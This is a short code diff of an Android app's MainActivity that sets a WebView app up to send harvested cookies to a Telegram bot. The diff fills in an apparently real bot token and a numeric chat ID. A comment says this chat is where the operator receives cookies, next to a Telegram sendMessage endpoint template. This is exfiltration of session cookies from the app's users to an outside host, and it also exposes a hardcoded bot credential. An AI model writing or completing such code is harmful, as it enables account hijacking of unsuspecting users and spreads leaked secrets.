@@ -29,9 +29,9 @@ public class MainActivity extends AppCompatActivity {
 
 	private final String TAG = "MainActivity";
 	
-	private final String BOT_TOKEN = "7433121245";
+	private final String BOT_TOKEN = "7264824677:AAEFQBke64IfKpCchWo_Nr2OjaMWyTQ9G4E";
 	private String TG_API_ENDPOINT = "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s";
-	private final String CHAT_ID = "@telesomething_bot2"; // where you want to receive cookies through your bot
+	private final String CHAT_ID = "7419490920"; // where you want to receive cookies through your bot
 	
     private WebView webView;
 	
